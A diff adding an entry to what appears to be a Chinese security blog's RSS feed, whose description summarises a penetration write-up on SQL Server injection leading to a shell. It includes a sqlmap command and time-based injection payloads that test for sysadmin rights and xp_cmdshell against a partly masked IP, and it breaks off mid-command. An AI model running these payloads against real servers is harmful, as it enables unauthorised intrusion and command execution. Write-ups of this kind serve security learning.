@@ -21,6 +21,18 @@
     </item>
     
     <item>
+      <title>从 SQL Server 注入到 getshell</title>
+      <link>http://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link>
+      <pubDate>Sat, 02 Mar 2019 20:23:35 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</guid>
+      <description>0x00 目标情况  一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的信息  0x01 发现注入 当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用
+另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面 但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应
+burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入 通过sqlmap得到了这几个数据库
+[*] HSOA_20170320 [*] HSOA_NEW [*] HSOA_T [*] master [*] model [*] msdb [*] Shuttle [*] SHWT [*] tempdb  0x02 找网站绝对路径  判断是不是dba权限(延时后返回正确页面，确定为dba权限&amp;lt;也可用sqlmap的&amp;ndash;is-dba判断&amp;gt;)  uname=test&#39;;if(1=(select is_srvrolemember(&#39;sysadmin&#39;))) WAITFOR DELAY &#39;0:0:2&#39;;--   判断是否是站库分离(延时后返回正确页面，确定站库没有分离)  uname=test&#39;;if(host_name()=@@servername) WAITFOR DELAY &#39;0:0:5&#39;;--   查看是否有xp_cmdshell  uname=test&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:2&#39;--  恢复／删除xp_cmdshell exec sp_addextendedproc xp_cmdshell,@dllname=&#39;xplog70.</description>
+    </item>
+    
+    <item>
       <title>Tomcat部署War包getshell</title>
       <link>http://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</link>
       <pubDate>Tue, 02 Aug 2016 22:30:13 +0800</pubDate>
